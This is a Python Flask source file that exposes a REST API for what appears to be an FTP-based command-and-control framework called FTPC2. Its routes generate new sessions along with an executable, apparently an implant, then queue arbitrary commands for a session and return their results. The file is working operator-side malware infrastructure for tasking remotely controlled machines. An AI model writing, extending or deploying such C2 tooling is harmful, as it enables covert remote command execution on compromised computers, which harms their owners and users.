from flask import Flask, jsonify, request
from common import FTPC2

def serve_api(c2: FTPC2) -> None:
    app = Flask('FTPC2 REST server')

    @app.route('/new')
    def new_session():
        session, executable = c2.gen_session()
        return jsonify({'success':True, 'session': session, 'executable': executable})

    @app.route('/cmd', methods=['POST'])
    def cmd():
        session = request.form.get('session')
        cmd = request.form.get('cmd')
        task_id = c2.write_pending(session, cmd)
        if task_id < 0:
            return jsonify({'success':False, 'reason': 'Session not found'})
        else:
            return jsonify({'success':True, 'task_id': task_id})

    @app.route('/result', methods=['POST'])
    def result():
        session = request.form.get('session')
        rid = request.form.get('id')
        data = c2.get_result(session, rid)
        return jsonify({'success':True, 'data': data})

    app.run(port=6666, debug=False, use_reloader=False, threaded=True)

